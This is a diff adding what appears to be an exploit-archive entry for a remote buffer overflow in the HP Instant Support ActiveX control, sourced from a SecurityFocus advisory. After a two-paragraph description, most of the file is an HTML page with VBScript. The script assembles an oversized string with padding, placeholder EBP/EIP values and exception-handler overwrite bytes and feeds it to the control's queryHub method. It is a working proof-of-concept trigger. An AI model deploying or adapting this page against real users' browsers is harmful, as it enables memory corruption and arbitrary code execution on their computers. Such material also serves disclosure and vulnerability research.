@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/24730/info
+
+HP Instant Support ActiveX control is prone to a remote buffer-overflow vulnerability because it fails to adequately bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.
+
+Exploiting this issue allows remote attackers to execute arbitrary code in the context of applications using the affected ActiveX control and possibly to compromise affected computers. 
+
+ <html>
+ <object classid='clsid:156BF4B7-AE3A-4365-BD88-95A75AF8F09D' id='test'></object>
+  <script language = 'vbscript'>
+   
+   buff             = String(222, "A")
+
+   get_EBP          = "cccc"
+
+   get_EIP          = unescape("aaaa")
+
+   buf1             = unescape("bbbb")
+
+   second_exception = unescape("%00%00%92%00")
+
+   first_exception  = unescape("%00%00%92%00")
+
+   buf2             = String(4000, "B")
+
+   egg              = buff + get_EBP + get_EIP + buf1 + second_exception + first_exception + buf2
+
+   test.queryHub egg
+ 
+ </script>
+</html>
